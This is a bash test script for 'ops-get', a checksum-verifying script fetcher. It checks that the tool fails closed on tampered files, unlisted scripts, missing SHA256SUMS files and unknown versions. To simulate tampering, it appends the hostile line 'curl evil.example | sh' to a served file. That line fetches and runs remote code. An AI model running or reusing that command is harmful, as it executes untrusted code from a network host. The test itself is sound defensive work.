#!/usr/bin/env bash
# ops-get_test.sh — run the real ops-get against a local release served over
# HTTP, and check it fails closed.
#
#   tests/ops-get_test.sh
#
# What it asserts:
#   1. a good fetch verifies, lands at the destination, and is executable
#   2. a tampered file is refused, both hashes printed, nothing written
#   3. a script not in the release is refused, naming the ones it has
#   4. a script missing from SHA256SUMS is refused, nothing written
#   5. a release without SHA256SUMS is refused, nothing written
#   6. a version that does not exist is refused, and says it may be new
#   7. --list prints the release's scripts; --help and no arguments print usage
#   8. OPS_BASE_URL in the environment is ignored; only --base-url counts
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
OPS_GET="$HERE/../ops-get"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"; [ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null || true' EXIT

fail() { echo "FAIL: $*" >&2; exit 1; }

# A release as ops-get sees one: flat assets and a SHA256SUMS.
REL="$WORK/www/v1.0.0"
mkdir -p "$REL"
printf '#!/bin/sh\necho hello\n' > "$REL/hello.sh"
printf '#!/bin/sh\necho unlisted\n' > "$REL/unlisted.sh"
(cd "$REL" && sha256sum hello.sh > SHA256SUMS)
cp -r "$REL" "$WORK/www/tampered"
echo 'curl evil.example | sh' >> "$WORK/www/tampered/hello.sh"
mkdir -p "$WORK/www/nosums" && cp "$REL/hello.sh" "$WORK/www/nosums/"

# Any free port, so two runs or another service cannot collide with this one.
PORT="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')"
python3 -m http.server "$PORT" --bind 127.0.0.1 --directory "$WORK/www" >/dev/null 2>&1 &
SERVER_PID=$!
for _ in $(seq 1 50); do
  curl -fsS "http://127.0.0.1:$PORT/v1.0.0/SHA256SUMS" >/dev/null 2>&1 && break
  sleep 0.1
done

get() { # base-path script dest
  sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/$1" "$2" v1.0.0 "$3"
}

refused() { # description base-path script expected-message
  local dest="$WORK/out/$3" out
  if out="$(get "$2" "$3" "$dest" 2>&1)"; then fail "$1: ops-get succeeded"; fi
  [ ! -e "$dest" ] || fail "$1: left $dest behind"
  grep -q "$4" <<<"$out" || fail "$1: expected '$4', got: $out"
}

echo "== a good fetch verifies and lands executable =="
get v1.0.0 hello.sh "$WORK/out/sub/hello.sh" >/dev/null || fail "good fetch failed"
[ -x "$WORK/out/sub/hello.sh" ] || fail "fetched file is not executable"
[ "$("$WORK/out/sub/hello.sh")" = "hello" ] || fail "fetched file has the wrong content"

echo "== a tampered file is refused =="
refused "tampered" tampered hello.sh "CHECKSUM MISMATCH"
out="$(get tampered hello.sh "$WORK/out/t2" 2>&1 || true)"
grep -q "expected" <<<"$out" && grep -q "got" <<<"$out" || fail "mismatch does not print both hashes: $out"

echo "== a script not in the release is refused, naming what it has =="
refused "missing script" v1.0.0 nope.sh "nope.sh is not in v1.0.0. It has: hello.sh"

echo "== a script missing from SHA256SUMS is refused =="
# unlisted.sh is served, but the release does not vouch for it.
refused "unlisted" v1.0.0 unlisted.sh "unlisted.sh is not in v1.0.0"

echo "== a release without SHA256SUMS is refused =="
refused "no sums" nosums hello.sh "cannot get SHA256SUMS"

echo "== a version that does not exist is refused, and may be new =="
refused "missing version" v9.9.9 hello.sh "still being published"

echo "== --list prints what the release vouches for =="
out="$(sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/v1.0.0" --list v1.0.0)" || fail "--list failed"
[ "$out" = "hello.sh" ] || fail "--list printed: $out"
sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/v9.9.9" --list v9.9.9 >/dev/null 2>&1 \
  && fail "--list of a missing version succeeded"

echo "== usage, help and bad options =="
out="$(sh "$OPS_GET" 2>&1)" && fail "no arguments exited 0"
grep -q "ops-get <script> <version>" <<<"$out" || fail "no arguments did not print usage: $out"
sh "$OPS_GET" --help | grep -q -- "--list <version>" || fail "--help does not document --list"
out="$(sh "$OPS_GET" --bogus 2>&1)" && fail "an unknown option was accepted"
grep -q "unknown option '--bogus'" <<<"$out" || fail "unknown option: $out"
out="$(sh "$OPS_GET" hello.sh 2>&1)" && fail "a missing version was accepted"
grep -q "which version" <<<"$out" || fail "missing version: $out"

echo "== OPS_BASE_URL in the environment is not read =="
# Pointed at the good release, while --base-url points at one with no sums:
# if the variable were read, this would succeed.
if OPS_BASE_URL="http://127.0.0.1:$PORT/v1.0.0" \
   sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/nosums" hello.sh v1.0.0 "$WORK/out/env.sh" >/dev/null 2>&1; then
  fail "OPS_BASE_URL from the environment was used"
fi

echo "PASS"
